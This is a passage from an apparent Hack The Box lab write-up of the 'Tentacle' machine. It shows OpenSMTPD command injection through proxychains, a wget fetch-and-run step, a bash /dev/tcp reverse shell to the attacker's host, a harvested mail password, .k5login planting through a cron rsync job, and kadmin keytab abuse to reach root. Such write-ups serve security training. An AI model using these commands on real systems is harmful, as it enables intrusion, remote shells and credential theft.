[proxychains] Strict chain  ...  10.129.44.237:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
220 smtp.realcorp.htb ESMTP OpenSMTPD
HELO x
250 smtp.realcorp.htb Hello x [10.241.251.1], pleased to meet you
MAIL FROM:&lt;;ping -c 1 10.10.15.147;&gt;                                        
250 2.0.0 Ok
RCPT TO:&lt;j.nakazawa@realcorp.htb&gt;
250 2.1.5 Destination address valid: Recipient ok
</pre></table></code></div></div><p>The user seems to exist. I also checked for the root user but it fails to send an email. So let’s continue with <strong>nakazawa</strong>.</p><p>To make the script work we need to change <strong>root</strong>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>
<span class="k">print</span><span class="p">(</span><span class="s">'[*] Payload sent'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'RCPT TO:&lt;root&gt;</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'DATA</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\r\n</span><span class="s">xxx</span><span class="se">\r\n</span><span class="s">.</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'QUIT</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'[*] Done'</span><span class="p">)</span>
</pre></table></code></div></div><p>Into <strong>j.nakazawa@realcorp.htb</strong>:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>
<span class="k">print</span><span class="p">(</span><span class="s">'[*] Payload sent'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'RCPT TO:&lt;j.nakazawa@realcorp.htb&gt;</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'DATA</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\r\n</span><span class="s">xxx</span><span class="se">\r\n</span><span class="s">.</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s">'QUIT</span><span class="se">\r\n</span><span class="s">'</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">'[*] Done'</span><span class="p">)</span>
</pre></table></code></div></div><p>Now let’s test the script by sending a ping request back to our local machine. Start a TCPdump listener:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes

</pre></table></code></div></div><p>Next, run the script with the ping command:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]
└─$ sudo proxychains python3 47984.py 10.241.251.113 25 'ping -c 4 10.10.15.147'
</pre></table></code></div></div><p>Let’s check if TCPdump captured any ICMP traffic:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp                       
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
10:28:14.689672 IP tentacle.htb &gt; 10.10.14.43: ICMP echo request, id 30, seq 1, length 64
10:28:14.689697 IP 10.10.14.43 &gt; tentacle.htb: ICMP echo reply, id 30, seq 1, length 64
10:28:15.692096 IP tentacle.htb &gt; 10.10.14.43: ICMP echo request, id 30, seq 2, length 64
10:28:15.692115 IP 10.10.14.43 &gt; tentacle.htb: ICMP echo reply, id 30, seq 2, length 64
10:28:16.693677 IP tentacle.htb &gt; 10.10.14.43: ICMP echo request, id 30, seq 3, length 64
10:28:16.693731 IP 10.10.14.43 &gt; tentacle.htb: ICMP echo reply, id 30, seq 3, length 64
10:28:17.695716 IP tentacle.htb &gt; 10.10.14.43: ICMP echo request, id 30, seq 4, length 64
10:28:17.695735 IP 10.10.14.43 &gt; tentacle.htb: ICMP echo reply, id 30, seq 4, length 64
</pre></table></code></div></div><p>Sweet! Because we received feedback from the mail server, we can try a reverse shell!</p><p>I tried to send a reverse shell directly, however this did not seem to work. My guess is that any use of bad characters gets filtered out, rendering the payload useless. So instead I used a python webserver to get the shell on the target machine.</p><p>Let’s create a simple shell-script chimpey.sh:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>#!/bin/bash

bash -i &gt;&amp; /dev/tcp/10.10.14.43/443 0&gt;&amp;1
</pre></table></code></div></div><p>Setup a python webserver:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]
└─$ sudo python3 -m http.server 80                                              
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</pre></table></code></div></div><p>Setup a listener:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]
└─$ nc -nlvp 443  
</pre></table></code></div></div><p>And run the script. The next command will get the file with wget, place it into the <strong>/dev/shm</strong> folder of the target and runs the script with the bash command.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>──(kali㉿kali)-[~/Documents/Other/HacktheBox/tentacel]
└─$ sudo proxychains python3 47984.py 10.241.251.113 25 'wget 10.10.14.43/chimpey1.sh -O /dev/shm/chimpey1.sh; bash /dev/shm/chimpey1.sh'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  10.129.44.237:3128  ...  127.0.0.1:3128  ...  10.197.243.77:3128  ...  10.241.251.113:25  ...  OK
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done

</pre></table></code></div></div><p>Ladies and gents: We have our first foothold!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ nc -nlvp 443                                                                                                                                                                     
listening on [any] 443 ...
connect to [10.10.14.43] from (UNKNOWN) [10.129.69.39] 59396
bash: cannot set terminal process group (150): Inappropriate ioctl for device
bash: no job control in this shell
root@smtp:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@smtp:~# 

</pre></table></code></div></div><p>After some enumerating I found a password, stored in the <strong>.msmtprc</strong> file:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>root@smtp:/home/j.nakazawa# cat .msmtprc
cat .msmtprc
# Set default values for all following accounts.
defaults
auth           on
tls            on
tls_trust_file /etc/ssl/certs/ca-certificates.crt
logfile        /dev/null

# RealCorp Mail
account        realcorp
host           127.0.0.1
port           587
from           j.nakazawa@realcorp.htb
user           j.nakazawa
password       sJB}RM&gt;6Z~64_
tls_fingerprint C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60

</pre></table></code></div></div><p>I tried to login via ssh with the newfound credentials, but sadly no easy win.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 718 402'%3E%3C/svg%3E" data-src="/assets/img/HTB/Tentacle/EternityLater.png" alt="Desktop View" width="718" height="402" data-proofer-ignore></p><p>Kinda took me a while to figure this one out, but the alarm bells should have rung when thinking back on port 88. Kerberos on a Linux machine is not uncommon, but it is unusual.</p><p>After some Google searching I stumpbled upon this <a href="https://docstore.mik.ua/orelly/networking_2ndEd/ssh/ch11_04.htm">website</a>. I just played around with the idea and it worked! So let’s jump to the next chapter and get that damn flag!</p><h2 id="the-powers-of-kerberos-combined-with-ssh"><span class="mr-2">The powers of Kerberos combined with SSH</span><a href="#the-powers-of-kerberos-combined-with-ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>So my understanding is: you have two authorization systems <strong>Kerberos</strong> and <strong>SSH</strong> and each includes features and services the other one lacks. The above mentioned website discusses how to combine the best of both worlds</p><p>So why is this method beneficial for us? Well, hear me out. The password did not work using ssh, however ssh kerberos is based on tickets. This opens up a whole new oppertunity because what we can do now is try to create our own ticket with the obtained credentials.</p><p>First things first: we need to create a ticket on our local machine so install the following package:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ apt search krb5
$ sudo apt install krb5-user
</pre></table></code></div></div><p>The next step is to configure the <strong>/etc/krb5.conf</strong> file.</p><p>Change libdefaults to the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>[libdefaults]
	default_realm = REALCORP.HTB
</pre></table></code></div></div><p>Add <strong>srv01.realcorp.htb</strong> to realms:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>[realms]
	REALCORP.HTB = {
		kdc = srv01.realcorp.htb
		kdc = kerberos.mit.edu
		kdc = kerberos-1.mit.edu
		kdc = kerberos-2.mit.edu:88
</pre></table></code></div></div><p>And finally add the following to domain realm (not sure if this part is needed).</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>[domain_realm]
	.realcorp.htb = REALCORP.HTB
	realcorp.htb = REALCORP.HTB
</pre></table></code></div></div><p>Make sure to add <strong>10.241.251.113 srv01.realcorp.htb</strong> to your <strong>etc/hosts</strong> file.</p><p>Next thing we need to do is request a ticket granted ticket (TGT). We can use the command <strong>kinit</strong> to renew our kerberos ticket:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>──(kali㉿kali)-[~]
└─$ kinit j.nakazawa   
Password for j.nakazawa@REALCORP.HTB: 
</pre></table></code></div></div><p>Use the password we have obtained earlier on.</p><p>You may notice nothing happened, but we can actually see if the ticket is granted using <strong>klist</strong>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ klist                                                                                                                                    1 ⨯
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: j.nakazawa@REALCORP.HTB

Valid starting       Expires              Service principal
07/30/2022 11:57:14  07/31/2022 11:57:14  krbtgt/REALCORP.HTB@REALCORP.HTB

</pre></table></code></div></div><p>Oh boy, oh boy, are you getting exited? I am! Let’s try to login with ssh:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ ssh j.nakazawa@10.129.105.158     
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Sat Jul 30 17:14:41 BST 2022 from 10.10.14.53 on ssh:notty
There were 20 failed login attempts since the last successful login.
Last login: Thu Dec 24 06:02:06 2020 from 10.10.14.2
[j.nakazawa@srv01 ~]$ id
uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[j.nakazawa@srv01 ~]$ 

</pre></table></code></div></div><p>Aaaah yeah, it’s our first flag!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>[j.nakazawa@srv01 ~]$ ls
user.txt
[j.nakazawa@srv01 ~]$ cat user.txt
3c67ae9ad324[...]

</pre></table></code></div></div><p>If your ssh connection seems to fail, make sure <strong>srv01.realcorp.htb</strong> is set as the first host in your <strong>etc/hostS</strong> file. I don’t know why but it didn’t work for me when my first host was tentacle.htb.</p><h2 id="exploiting-the-log_backup-script"><span class="mr-2">Exploiting the log_backup script</span><a href="#exploiting-the-log_backup-script" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After some enumerating <strong>one eternity later</strong> I found a <strong>log_backup.sh</strong> script, using <strong>cat /etc/crontab</strong>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>[j.nakazawa@srv01 ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
* * * * * admin /usr/local/bin/log_backup.sh

</pre></table></code></div></div><p>So let’s have a looksey:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">[</span>j.nakazawa@srv01 ~]<span class="nv">$ </span><span class="nb">cat</span> /usr/local/bin/log_backup.sh
<span class="c">#!/bin/bash</span>

/usr/bin/rsync <span class="nt">-avz</span> <span class="nt">--no-perms</span> <span class="nt">--no-owner</span> <span class="nt">--no-group</span> /var/log/squid/ /home/admin/
<span class="nb">cd</span> /home/admin
/usr/bin/tar czf squid_logs.tar.gz.<span class="sb">`</span>/usr/bin/date +%F-%H%M%S<span class="sb">`</span> access.log cache.log
/usr/bin/rm <span class="nt">-f</span> access.log cache.log

</pre></table></code></div></div><p>The script seems to be using rsync to copy all the files from /var/log/squid/ to /home/admin/ and then create an archive using tar.</p><p>Let’s see if we have any permissions to <strong>/var/log/squid</strong>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>[j.nakazawa@srv01 tmp]$ ls -ld /var/log/squid/
drwx-wx---. 2 admin squid 41 Jul 30 17:30 /var/log/squid/

</pre></table></code></div></div><p>We can see you need to be the admin user or you need to be part of the squid group. Use the following command to check if we are part of the squid group:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>[j.nakazawa@srv01 tmp]$ id
uid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

</pre></table></code></div></div><p>Would you look at that… it seems we are!</p><h3 id="grant-permissions-with-kerberos-k5login-file"><span class="mr-2">Grant permissions with kerberos .k5login file</span><a href="#grant-permissions-with-kerberos-k5login-file" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>So what can we do now? Well, with ssh Kerberos it is actually possible to grant someone else access to your account via Kerberos. To grant other users access we need to create a <strong>.k5login</strong> file. In this file you can list different Kerberos principals, in our case j.nakazawa. This will basically give the principals added to that list permission to authenticate with their tickets as the user that stored the <strong>.k5login</strong> file in his/her home directory.</p><p>In this scenario the <strong>log_backup.sh</strong> script copies files to the /home/admin/ directory. What we can do is create a <strong>k5login</strong> file that contains the <strong>j.nakazawa</strong> user and add it to the admin’s home directory.</p><p>Let’s write a simple <strong>.k5login</strong> file and store it in the <strong>/var/log/squid</strong> directory:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>[j.nakazawa@srv01 /]$ echo "j.nakazawa@REALCORP.HTB" &gt; /var/log/squid/.k5login
[j.nakazawa@srv01 /]$ cd /var/log/squid/
[j.nakazawa@srv01 squid]$ cat .k5login
j.nakazawa@REALCORP.HTB

</pre></table></code></div></div><p>Now if the next cron triggers, it will add the file to the <strong>/home/admin</strong> directory, as we have seen in the <strong>log_backup.sh</strong> script. Because the <strong>.k5login</strong> file is stored in the admin’s home directory, our <strong>j.nakazawa</strong> user can get access as the admin user:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>┌──(kali㉿kali)-[~]
└─$ ssh admin@realcorp.htb
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Sat Jul 30 17:38:01 2022
[admin@srv01 ~]$ id
uid=1011(admin) gid=1011(admin) groups=1011(admin),23(squid) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[admin@srv01 ~]$ 

</pre></table></code></div></div><p>YAAAAAAAAAAAAAAAASH we are the admin user!</p><p>BUUUUUUUUUUUUUT we are still not there yet!</p><h2 id="kerberos-keytab"><span class="mr-2">Kerberos Keytab</span><a href="#kerberos-keytab" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>After some enummerating, I noticed that I was able to read <strong>krb5.keytab</strong>. This file is only readable by the admin or root user:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>[admin@srv01 etc]$ ls -la /etc/krb5.keytab
-rw-r-----. 1 root admin 1403 Dec 19  2020 /etc/krb5.keytab

</pre></table></code></div></div><p>I found some more information about keytab on this <a href="https://web.mit.edu/kerberos/krb5-devel/doc/basic/keytab_def.html">website</a>. Keytab is a file that stores keys for principals.</p><p>To see the list of principals we can use <strong>klist -k</strong>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>                                                                                                   �[admin@srv01 etc]$ 
[admin@srv01 etc]$ klist -k
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 host/srv01.realcorp.htb@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/changepw@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB
   2 kadmin/admin@REALCORP.HTB

</pre></table></code></div></div><p>We can see that our user is also <strong>kadmin</strong> that has admin and change password privileges. This means that we can add principals to the <strong>keytab</strong> file.</p><p>For more information about <strong>kadmin</strong> go to this <a href="https://web.mit.edu/kerberos/krb5-1.12/doc/admin/admin_commands/kadmin_local.html">website</a></p><p>Run the following to run the kadmin console:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>[admin@srv01 etc]$ kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
Couldn't open log file /var/log/kadmind.log: Permission denied
Authenticating as principal kadmin/admin@REALCORP.HTB with keytab /etc/krb5.keytab.

</pre></table></code></div></div><p>Now lets add a new principal and give it an easy password:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>kadmin:  add_principal root
No policy specified for root@REALCORP.HTB; defaulting to no policy
Enter password for principal "root@REALCORP.HTB": 
Re-enter password for principal "root@REALCORP.HTB": 
Principal "root@REALCORP.HTB" created.

</pre></table></code></div></div><p>What we can do now is exit out of <strong>kadmin</strong> console and run <strong>ksu</strong>. What <strong>ksu</strong> does is running su using Kerberos:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>kadmin:  exit
[admin@srv01 etc]$ ksu
WARNING: Your password may be exposed if you enter it here and are logged 
         in remotely using an unsecure (non-encrypted) channel. 
Kerberos password for root@REALCORP.HTB: : 
Authenticated root@REALCORP.HTB
Account root: authorization for root@REALCORP.HTB successful
Changing uid to root (0)
[root@srv01 etc]# 

</pre></table></code></div></div><p>And there it is! Now let’s get that last flag!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>[root@srv01 etc]# cd /root
